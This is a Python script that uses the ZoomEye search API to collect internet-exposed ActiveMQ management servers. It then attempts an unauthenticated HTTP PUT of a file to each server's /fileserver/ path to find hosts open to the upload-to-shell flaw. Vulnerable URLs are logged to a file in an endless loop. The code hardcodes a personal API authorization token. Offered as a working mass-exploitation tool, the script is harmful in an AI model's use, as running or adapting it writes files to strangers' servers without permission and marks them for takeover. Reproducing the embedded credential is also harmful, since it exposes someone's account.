#! /usr/bin/env python
# -*- coding:utf-8 -*-
 
import requests
import json
import re
 
 
def api_get(page): # zoomeye api get搜索ActiveMQ关键词的地址(每天10000条搜索上限)
    ip_list = []
    headers = {'Authorization': 'JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6IjQ5OTc0NDE4N0BxcS5jb20iLCJpYXQiOjE1NTM5Mjk4MTAsIm5iZiI6MTU1MzkyOTgxMCwiZXhwIjoxNTUzOTczMDEwfQ.vL3-PGNheuoAQ5Lan7HZyTGd70NDpl7gxHUh7f1jI0c'}
    geturl = 'https://api.zoomeye.org/host/search?query=ActiveMQ&facets=app,os&page=%d'% page
    try:
        req = requests.get(url=geturl,headers=headers)
        decoded = json.loads(req.text)
        for info in decoded['matches']:
            ip = (info['ip'])
            portinfo = info['portinfo']
            port = portinfo['port']
            mch = re.search('Manage ActiveMQ broker',portinfo['banner']) # 筛选确定为 ActiveMQ的管理页面
            if mch is not None:
                result = (str(ip) + ':' + str(port))
                ip_list.append(result)
    except Exception:
        print('zoomeye api 出错')
    return ip_list
 
def saveListToFile(file,list):  # 将列表逐行写如文件中
    s = '\n'.join(list)
    try:
        with open(file,'a') as output:
            output.write(s)
    except Exception:
        print('txt文件没有写入权限')
 
def check_getshell(ip_list): # 检查是否有漏洞
    good_url_list = []
    for ip in ip_list:
        puturl = 'http://%s/fileserver/test.txt' % ip
        try:
            req = requests.put(url=puturl, data='ok',timeout=0.5)
            if req.status_code == 204:
                print (puturl + ' is ok')
                good_url_list.append(puturl)
        except Exception:
            print ('网站访问太慢跳过')
    return good_url_list
 
def main():
    page = 1
    print('开始抓漏洞url')
    while (1):
        print('正在抓取第' + str(page) + '页')
        good_url_list = check_getshell(api_get(page))
        saveListToFile('good.txt',good_url_list)
        page = page + 1
 
 
if __name__=='__main__':
    main()